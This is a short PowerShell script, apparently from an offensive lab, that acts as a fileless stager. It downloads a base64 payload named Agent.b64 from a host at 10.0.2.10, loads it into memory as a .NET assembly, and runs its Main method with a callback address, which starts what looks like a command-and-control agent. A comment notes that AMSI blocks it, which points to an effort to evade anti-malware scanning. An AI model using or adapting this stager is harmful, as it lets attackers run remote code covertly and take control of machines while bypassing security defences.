//Not working : AMSI
$b64 = (iwr "http://10.0.2.10/Agent.b64" -UseBasicParsing).Content
$bytes = [System.Convert]::FromBase64String([System.Text.Encoding]::ASCII.GetString($b64))
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entryPointMethod =  $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
$entryPointMethod.Invoke($null, (, [string[]] ('https:10.0.2.10:443')))
